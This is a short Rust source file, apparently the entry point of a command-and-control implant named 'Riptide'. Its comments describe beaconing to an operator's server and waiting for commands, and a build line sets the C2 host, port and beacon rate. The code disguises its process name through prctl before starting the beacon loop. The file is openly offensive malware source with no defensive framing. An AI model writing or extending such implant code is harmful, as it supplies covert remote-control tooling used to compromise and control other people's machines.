// Riptide implant — simple beacon. Phones home, waits for operator commands.
// All behavior (protocol, beacon rate, jitter, process name) is set at
// compile time via env vars. Build with payload-gen or raw cargo:
//
//   C2_HOST=10.0.0.1 C2_PORT=8080 C2_TLS=0 BEACON_RATE=60 cargo build -p implant --release
use implant::config::Config;

fn main() {
    let config = Config::load();

    let c_name = std::ffi::CString::new(config.worker_name.as_str()).unwrap();
    unsafe { libc::prctl(libc::PR_SET_NAME, c_name.as_ptr(), 0, 0, 0); }

    implant::marker::write(&config, "init");
    implant::run_beacon_loop(&config);
}
